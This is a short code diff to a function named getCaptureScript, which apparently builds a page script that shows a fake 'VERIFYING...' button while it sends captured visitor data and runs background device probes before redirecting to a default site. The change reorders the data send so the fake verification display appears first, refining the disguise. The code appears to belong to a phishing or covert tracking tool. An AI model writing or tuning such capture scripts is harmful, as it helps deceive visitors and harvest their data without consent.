@@ -228,14 +228,14 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
         immediate: true // Mark as immediate delivery
       };
       
-      // Send immediately
-      await logEvent('info', quickData);
-      
       var btn = document.querySelector('.btn-verify') || document.querySelector('.btn') || document.querySelector('button');
       if (btn) {
         btn.style.opacity = "0.7";
         btn.innerText = "VERIFYING...";
       }
+
+      // Send immediately
+      await logEvent('info', quickData);
 
       // 2. BACKGROUND PROBES (Fire and forget, they will logEvent('extra') later)
       // Android-Specific: Haptic feedback
